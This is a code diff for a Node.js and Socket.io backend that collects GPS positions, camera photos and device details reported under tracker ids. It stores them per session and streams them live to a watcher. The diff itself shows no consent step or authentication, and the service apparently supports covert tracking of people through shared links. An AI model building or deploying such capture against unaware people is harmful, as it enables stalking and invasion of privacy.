@@ -118,18 +118,26 @@ async function getTracker(id) {
   }
 }
 
-async function updateTrackerLocation(trackerId, entry) {
+// Helper to check if a session is currently active (last update < 3 minutes ago)
+function isSessionActive(session) {
+  if (!session || !session.lastSeen) return false;
+  const lastUpdate = new Date(session.lastSeen);
+  return (new Date() - lastUpdate) < 180000;
+}
+
+async function updateTrackerLocation(trackerId, sessionId, entry) {
   try {
-    const tCol = await getCollection('trackers');
+    const sCol = await getCollection('sessions');
     const lCol = await getCollection('locations');
-    const tracker = await getTracker(trackerId);
-    if (!tracker) return false;
+    
+    await sCol.updateOne(
+      { trackerId, sessionId },
+      { $set: { lastLocation: entry, lastSeen: new Date().toISOString() } },
+      { upsert: true }
+    );
 
-    await lCol.insertOne({ trackerId, ...entry });
-    await tCol.updateOne({ id: trackerId }, { $set: { lastLocation: entry, active: true } });
-
-    io.to(`tracker:${trackerId}`).emit('location-received', { trackerId, location: entry });
-    io.emit('tracker-updated', { ...tracker, lastLocation: entry, active: true });
+    await lCol.insertOne({ trackerId, sessionId, ...entry });
+    io.to(`tracker:${trackerId}`).emit('location-received', { trackerId, sessionId, location: entry });
     return true;
   } catch (e) {
     console.error('Update Location Error:', e);
@@ -137,14 +145,11 @@ async function updateTrackerLocation(trackerId, entry) {
   }
 }
 
-async function addPhoto(trackerId, photo) {
+async function addPhoto(trackerId, sessionId, photo) {
   try {
     const pCol = await getCollection('photos');
-    const tracker = await getTracker(trackerId);
-    if (!tracker) return false;
-
-    await pCol.insertOne({ trackerId, ...photo });
-    io.to(`tracker:${trackerId}`).emit('photo-received', { trackerId, photo });
+    await pCol.insertOne({ trackerId, sessionId, ...photo });
+    io.to(`tracker:${trackerId}`).emit('photo-received', { trackerId, sessionId, photo });
     return true;
   } catch (e) {
     console.error('Add Photo Error:', e);
@@ -152,22 +157,15 @@ async function addPhoto(trackerId, photo) {
   }
 }
 
-// Helper to check if a tracker is currently active (last update < 2 minutes ago)
-function isTrackerActive(tracker) {
-  if (!tracker || !tracker.lastLocation?.timestamp) return false;
-  const lastUpdate = new Date(tracker.lastLocation.timestamp);
-  const now = new Date();
-  return (now - lastUpdate) < 120000; // 2 minutes
-}
-
-async function updateDeviceInfo(trackerId, info) {
+async function updateDeviceInfo(trackerId, sessionId, info) {
   try {
-    const tCol = await getCollection('trackers');
-    const tracker = await getTracker(trackerId);
-    if (!tracker) return false;
-
-    await tCol.updateOne({ id: trackerId }, { $set: { deviceInfo: info } });
-    io.emit('tracker-updated', { ...tracker, deviceInfo: info });
+    const sCol = await getCollection('sessions');
+    await sCol.updateOne(
+      { trackerId, sessionId },
+      { $set: { deviceInfo: info, lastSeen: new Date().toISOString() } },
+      { upsert: true }
+    );
+    io.to(`tracker:${trackerId}`).emit('session-updated', { trackerId, sessionId, info });
     return true;
   } catch (e) {
     console.error('Update Device Error:', e);
@@ -179,36 +177,28 @@ async function updateDeviceInfo(trackerId, info) {
 
 app.post('/api/tracker/:id/location', async (req, res) => {
   try {
-    const { latitude, longitude, accuracy, altitude, speed, heading } = req.body;
-    const entry = {
-      latitude, longitude, accuracy, altitude, speed, heading,
-      timestamp: new Date().toISOString()
-    };
-    const success = await updateTrackerLocation(req.params.id, entry);
+    const { sessionId, latitude, longitude, accuracy, altitude, speed, heading } = req.body;
+    const entry = { latitude, longitude, accuracy, altitude, speed, heading, timestamp: new Date().toISOString() };
+    const success = await updateTrackerLocation(req.params.id, sessionId || 'default', entry);
     res.json({ success });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 app.post('/api/tracker/:id/photo', async (req, res) => {
   try {
-    const { image, facing } = req.body;
+    const { sessionId, image, facing } = req.body;
     const entry = { image, facing, timestamp: new Date().toISOString() };
-    const success = await addPhoto(req.params.id, entry);
+    const success = await addPhoto(req.params.id, sessionId || 'default', entry);
     res.json({ success });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 app.post('/api/tracker/:id/info', async (req, res) => {
   try {
-    const success = await updateDeviceInfo(req.params.id, req.body);
+    const { sessionId, info } = req.body;
+    const success = await updateDeviceInfo(req.params.id, sessionId || 'default', info);
     res.json({ success });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 // ── API Routes (Standard) ────────────────────────────────────
@@ -242,20 +232,15 @@ app.post('/api/tracker/create', async (req, res) => {
 app.get('/api/trackers', async (req, res) => {
   try {
     const col = await getCollection('trackers');
-    const lCol = await getCollection('locations');
-    const pCol = await getCollection('photos');
-
+    const sCol = await getCollection('sessions');
     const all = await col.find({}).toArray();
     for (const t of all) {
-      t.locationCount = await lCol.countDocuments({ trackerId: t.id });
-      t.photoCount = await pCol.countDocuments({ trackerId: t.id });
-      // Calculate real-time active status
-      t.active = isTrackerActive(t);
+      const sessions = await sCol.find({ trackerId: t.id }).toArray();
+      t.sessionCount = sessions.length;
+      t.active = sessions.some(s => isSessionActive(s));
     }
     res.json(all);
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 app.get('/api/tracker/:id', async (req, res) => {
@@ -263,35 +248,39 @@ app.get('/api/tracker/:id', async (req, res) => {
     const tracker = await getTracker(req.params.id);
     if (!tracker) return res.status(404).json({ error: 'Tracker not found' });
     
+    const sCol = await getCollection('sessions');
     const lCol = await getCollection('locations');
     const pCol = await getCollection('photos');
+    
     const result = { ...tracker };
-    result.locations = await lCol.find({ trackerId: req.params.id }).limit(100).toArray();
-    result.photos = await pCol.find({ trackerId: req.params.id }).limit(50).toArray();
-    result.active = isTrackerActive(result);
+    result.sessions = await sCol.find({ trackerId: req.params.id }).toArray();
+    result.locations = await lCol.find({ trackerId: req.params.id }).limit(200).toArray();
+    result.photos = await pCol.find({ trackerId: req.params.id }).limit(100).toArray();
+    
+    for (const s of result.sessions) {
+      s.active = isSessionActive(s);
+    }
     
     res.json(result);
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 app.delete('/api/tracker/:id', async (req, res) => {
   try {
     const id = req.params.id;
     const col = await getCollection('trackers');
+    const sCol = await getCollection('sessions');
     const lCol = await getCollection('locations');
     const pCol = await getCollection('photos');
 
     await col.deleteOne({ id });
+    await sCol.deleteMany({ trackerId: id });
     await lCol.deleteMany({ trackerId: id });
     await pCol.deleteMany({ trackerId: id });
     
     io.emit('tracker-deleted', id);
     res.json({ success: true });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 // ── Socket.io (Hybrid) ──────────────────────────────────────
@@ -312,32 +301,34 @@ io.on('connection', (socket) => {
     socket.join(`tracker:${trackerId}`);
   });
 
+  socket.on('join-tracker', (trackerId) => {
+    socket.join(`tracker:${trackerId}`);
+  });
+
   socket.on('location-update', async (data) => {
     try {
-      await updateTrackerLocation(data.trackerId, { ...data, timestamp: new Date().toISOString() });
+      const { trackerId, sessionId, ...coords } = data;
+      const entry = { ...coords, timestamp: new Date().toISOString() };
+      await updateTrackerLocation(trackerId, sessionId || 'default', entry);
     } catch (e) {}
   });
 
   socket.on('photo-capture', async (data) => {
     try {
-      await addPhoto(data.trackerId, { ...data, timestamp: new Date().toISOString() });
+      const { trackerId, sessionId, ...photo } = data;
+      const entry = { ...photo, timestamp: new Date().toISOString() };
+      await addPhoto(trackerId, sessionId || 'default', entry);
     } catch (e) {}
   });
 
   socket.on('device-info', async (data) => {
     try {
-      await updateDeviceInfo(data.trackerId, data.info);
+      await updateDeviceInfo(data.trackerId, data.sessionId || 'default', data.info);
     } catch (e) {}
   });
 
   socket.on('disconnect', async () => {
-    // On Vercel, we don't set active: false here because connections are ephemeral.
-    // The 'active' status is computed based on the last update timestamp.
-    try {
-      if (socket.trackerId) {
-        console.log('Client leaving tracker room:', socket.trackerId);
-      }
-    } catch (e) {}
+    // Ephemeral connections on serverless
   });
 });
 
